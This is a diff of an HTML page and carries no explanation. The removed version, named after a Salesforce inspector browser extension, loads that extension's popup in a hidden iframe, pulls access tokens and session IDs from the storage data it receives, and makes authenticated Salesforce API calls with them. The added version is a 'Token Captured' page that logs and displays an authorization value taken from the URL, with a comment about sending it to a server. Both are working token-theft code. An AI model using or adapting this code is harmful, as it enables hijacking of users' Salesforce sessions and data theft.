@@ -1,125 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SFDC Inspector Reloaded</title>
-    <style>
-        body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
-        #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
-        #requestInfo { 
-            background: #e3f2fd;
-            padding: 15px;
-            border-radius: 4px;
-            margin-top: 20px;
-        }
-        pre { white-space: pre-wrap; }
-    </style>
-</head>
-<body>
-    <div id="messages">Loading...</div>
-    <div id="requestInfo"></div>
+    <title>Token Captured</title>
     <script>
-        const messagesDiv = document.getElementById('messages');
-        const requestInfoDiv = document.getElementById('requestInfo');
-        
-        function makeRequest(url, accessToken) {
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', `https://${url}/services/data/v61.0/limits`, true);
-            xhr.setRequestHeader('Authorization', `Bearer ${accessToken}`);
+        // Log the token and redirect if needed
+        window.addEventListener('load', () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const authHeader = urlParams.get('authorization');
             
-            xhr.onreadystatechange = function() {
-                requestInfoDiv.innerHTML += `
-                    <h3>Request State ${xhr.readyState}:</h3>
-                    <pre>Status: ${xhr.status}</pre>
-                    <pre>Headers Sent: ${xhr.getAllRequestHeaders?.() || 'N/A'}</pre>
-                    <pre>Headers Received: ${xhr.getAllResponseHeaders()}</pre>
-                    <pre>Response: ${xhr.responseText}</pre>
+            if (authHeader) {
+                console.log('Authorization Header:', authHeader);
+                // You could also send this to your server or handle it however you need
+                document.body.innerHTML = `
+                    <h2>Token Captured!</h2>
+                    <pre>${authHeader}</pre>
                 `;
-            };
-            
-            xhr.onerror = function(e) {
-                requestInfoDiv.innerHTML += `
-                    <h3>Error:</h3>
-                    <pre>${JSON.stringify(e, null, 2)}</pre>
-                `;
-            };
-            
-            try {
-                xhr.send();
-            } catch(e) {
-                requestInfoDiv.innerHTML += `
-                    <h3>Send Error:</h3>
-                    <pre>${e.toString()}</pre>
-                `;
-            }
-        }
-
-        window.addEventListener('message', function(event) {
-            if (event.data.insextInitRequest) {
-                messagesDiv.innerHTML = '<pre>Init Request: ' + JSON.stringify(event.data, null, 2) + '</pre>';
-                
-                const storage = event.data.iFrameLocalStorage;
-                
-                // Debug output to see all available keys
-                requestInfoDiv.innerHTML = `
-                    <h3>Available Storage Keys:</h3>
-                    <pre>${JSON.stringify(Object.keys(storage), null, 2)}</pre>
-                `;
-
-                // Look for instance URL
-                const hostKey = Object.keys(storage).find(key => key.endsWith('_orgInstance'));
-                
-                // Look for access token with multiple possible patterns
-                const tokenPatterns = [
-                    '_accessToken',
-                    '_sid',
-                    '_sessionId',
-                    'access_token',
-                    'sid'
-                ];
-                
-                let accessToken = null;
-                let tokenKey = null;
-                
-                // Try each pattern
-                for (const pattern of tokenPatterns) {
-                    tokenKey = Object.keys(storage).find(key => key.endsWith(pattern));
-                    if (tokenKey) {
-                        accessToken = storage[tokenKey];
-                        break;
-                    }
-                }
-
-                // Look for token in the entire event data structure
-                if (!accessToken && event.data.sessionId) {
-                    accessToken = event.data.sessionId;
-                }
-
-                requestInfoDiv.innerHTML += `
-                    <h3>Authentication Information Found:</h3>
-                    <pre>Host Key: ${hostKey || 'Not found'}</pre>
-                    <pre>Token Key: ${tokenKey || 'Not found'}</pre>
-                    <pre>Token Found: ${Boolean(accessToken)}</pre>
-                    <pre>Token Pattern Used: ${tokenKey ? tokenKey.split('_').pop() : 'None'}</pre>
-                `;
-
-                if (hostKey && accessToken) {
-                    const hostUrl = storage[hostKey];
-                    
-                    requestInfoDiv.innerHTML += `
-                        <h3>Attempting authenticated request to:</h3>
-                        <pre>https://${hostUrl}/services/data/v61.0/limits</pre>
-                        <pre>Using token: ${accessToken.substring(0, 10)}...</pre>
-                    `;
-                    
-                    makeRequest(hostUrl, accessToken);
-                }
             }
         });
-
-        const initFrame = document.createElement('iframe');
-        initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
-        initFrame.style.display = 'none';
-        document.body.appendChild(initFrame);
     </script>
+</head>
+<body>
+    <h2>Processing...</h2>
 </body>
 </html>
